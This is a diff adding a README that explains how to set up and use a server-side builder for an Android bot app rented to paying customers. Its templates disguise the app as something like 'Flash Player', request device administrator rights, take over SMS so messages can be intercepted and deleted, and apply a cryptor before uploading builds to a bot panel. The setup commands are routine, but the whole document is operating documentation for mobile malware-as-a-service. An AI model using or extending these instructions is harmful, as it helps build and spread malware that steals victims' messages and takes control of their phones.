@@ -1,0 +1,196 @@
+
+Frontend server setup
+
+- VPS with debian, 64, 16 GB ram will be good for fast builds
+
+You have to install apache 2, python 3.4 or newer, mysql server, java 1.8, imagemagick, git
+
+- all files should be placed in /var/data/
+
+- you can hide entire '/var/data' folder into veracrypt container and mount it to /var/data then. But take a note that you have to re-mount it manually with a password after each server reboot.
+So better to use servers with full hdd crypted.
+
+
+
+Structure:
+
+
+/var/data/
+	android.sdk/
+	sites-enabled/ - apache configs for virtualhosts
+		Point apache to use /var/data/sites-enabled/ as main virtualhosts folder
+		
+	www/
+		app/ -- Android studio app project. Sources in www/app/app/src/main/ (AndroidManifest.xml, java, res, etc)
+		builder -- builder written in python 3 to manage customers, their templates, build it, crypt it and upload on backend server automatically.
+			Builder usage - see below
+			
+	builder.sql - main builder database
+	module2dex - utility to compile dynamic mods (see below)
+		copy to this directory:
+			Android/Sdk/build-tools/x.x.0/jack.jar
+			Android/Sdk/platforms/android-xx/android.jar
+
+	
+	
+Setup:
+
+- setup git in /var/data/www/app/app/src/main first
+
+
+	Setup git:
+
+	mkdir /var/data/git.db
+	cd /var/data/git.db
+	git init --bare --share 
+	
+	
+	
+	cd /var/data/www/app/app/src/main/
+	git init
+	git add .
+	git commit -m "first commit"
+	git remote add origin root@localhost:/var/data/git.db/
+	git push --set-upstream origin master
+	git push 										# enter root password
+
+	cd /var/data/www/app/app/src/
+	git checkout root@localhost:/var/data/git.db  # enter root password
+	mv git.db main
+
+	For every change in bot sources, you have to save changes in git:
+
+	1. click Reset button in Builder
+	2. upload your changes to the server
+	3. go to app/app/src/main/
+	4. git add .
+	5. git commit -m "new translation"
+	6. git push
+
+
+- chmod +x /var/data/www/builder/start.py
+
+- download android sdk to android.sdk/ folder.   Link (690 mb) - https://yadi.sk/d/kbFK43dm3NMHS4
+	Content of Android/Sdk/ should be placed in /var/data/android.sdk/
+	
+	It can be taken from user home directory after installing Android Studio: /home/username/Android/Sdk/ on linux (1.5-2 gb)
+
+- try to build:   
+	cd /var/data/www/app ; ./gradlew aR
+
+NOTE: bot can be compiled success only after Builder set and "Set+Crypt" button pressed
+So you must apply template to sources to make them buildable
+
+- If gradle downloading is failed: download gradle 3.3 manually:
+wget https://services.gradle.org/distributions/gradle-3.3-all.zip
+mv gradle-3.3-all.zip ~/.gradle/wrapper/dists/gradle-3.3-all/
+./gradlew aR
+
+- install java 1.8 (important! 1.8, not 1.7)
+	INSTALL 1.8 on DEBIAN:
+	
+		echo "deb http://ppa.launchpad.net/webupd8team/java/ubuntu trusty main" >> /etc/apt/sources.list.d/java-8-debian.list
+		echo "deb-src http://ppa.launchpad.net/webupd8team/java/ubuntu trusty main" >> /etc/apt/sources.list.d/java-8-debian.list
+		apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EEA14886
+		apt-get update
+		apt-get install oracle-java8-installer
+		java -version
+
+java version "1.8.0_131"
+Java(TM) SE Runtime Environment (build 1.8.0_131-b11)
+Java HotSpot(TM) 64-Bit Server VM (build 25.131-b11, mixed mode)
+
+- make cert
+	cd /var/data/www/app/
+	./make_cert.sh
+
+
+- build test app
+cd /var/data/www/app ; ./gradlew aR
+
+- check APK file:
+ls /var/data/www/app/app/build/outputs/apk/
+
+
+
+- setup www/builder/config.py
+
+- create dir for the gradle
+mkdir /var/www/.gradle
+chown -R www-data:www-data /var/www/.gradle
+
+
+- compile dynamic mods with module2dex script
+	
+	- run rebuild_all.sh
+	- take results from bot_mods/
+	- upload *.dex files to backend server - www/base/bot/bot_mods/
+	
+	* build_mod.sh - use it to rebuild 1 specified mod
+	* sources of mods can be found in app/app/src/main/java/com/moonny/mods_src/*java
+
+
+Builder usage:
+
+Top menu:
+- Access list -- just shows all access data of all customers
+- +1 free day -- add 1 day to each customer rent date
+- All themes -- show all existing templates with icons
+- Dump Get / Put -- get database dump
+- DAILY BACKUPS -- just browse builder/backup/ directory
+- Import client -- import new customer data from backend admin panel "add customer form" -- to fast add new customers
+- Check servers -- checks backend/frontend/customers vps ips availability
+
+Customers list:
+"customer name" - "folder name (in clients/ folder on backend server)" - "registered date" - "expire date"
+
+- edit - edit selected customer
+- add - add new customer
+- rebuild - rebuild all selected customer apks and auto-upload to his panel on backend server (to www/apks/)
+- custom build - allows to select users and templates, then build selected (with auto-upload to the backend server)
+
+
+Templates list:
+"name of template" - "[SMS] [SKS]" -- sms deleter and socks (not used) markers
+
+Template add form:
+"App name" -- readable name, like "Flash Player"
+"device admin label" - what you see on the phone in Settings - Security - "Device administrators" 
+
+"api tag" - unique tag for apk that will be shown in bot panel. You can filter bots by this tag. Use macros %DATE% to add d.m.y date to tag or it will be prepended automatically
+
+For icon you can choose exisitng in "Icon set" drop down list
+or fill "New icon" and "Icon name" fields to add new one.
+
+"SMS Admin required" -- sms deleter feauture. It can ask user to become default sms messenger (to be allowed to delete sms) right after install, or when "SMS Intercept" command sent from panel.
+
+"Socks enabled" - not used
+"Injects modifer" - useless
+
+
+
+Right pane buttons - used for local development only
+
+Set+crypt - set current template to sources, then use cryptor (without build)
+Set -- just set, without crypt
+Reset -- reset sources to default state (you should keep sources in git for that. It uses builder/sh/git_co.sh)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
